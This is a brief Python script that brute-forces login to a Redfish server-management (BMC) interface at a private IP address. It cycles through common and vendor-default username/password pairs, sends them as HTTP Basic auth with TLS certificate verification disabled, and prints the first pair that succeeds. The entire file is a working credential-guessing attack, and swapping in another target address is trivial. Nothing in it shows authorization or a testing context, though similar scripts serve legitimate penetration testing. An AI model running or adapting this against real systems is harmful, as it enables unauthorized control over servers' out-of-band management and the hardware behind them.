import urllib.request, json, ssl, base64

def fetch_auth(url, username, password):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url)
    auth = base64.b64encode(f"{username}:{password}".encode()).decode('ascii')
    req.add_header('Authorization', f'Basic {auth}')
    req.add_header('Accept', 'application/json')
    req.add_header('OData-Version', '4.0')
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
            if response.status == 200:
                return True
    except Exception:
        pass
    return False

# Common passwords
creds = [("Administrator", "password"), ("Administrator", "admin"), ("root", "calvin"), ("Administrator", "password123"), ("root", "password")]
base = "https://192.168.2.210/redfish/v1/Systems/1/"

for u, p in creds:
    print(f"Trying {u}:{p}...")
    if fetch_auth(base, u, p):
        print(f"SUCCESS: {u}:{p}")
        break
else:
    print("No valid credentials found.")
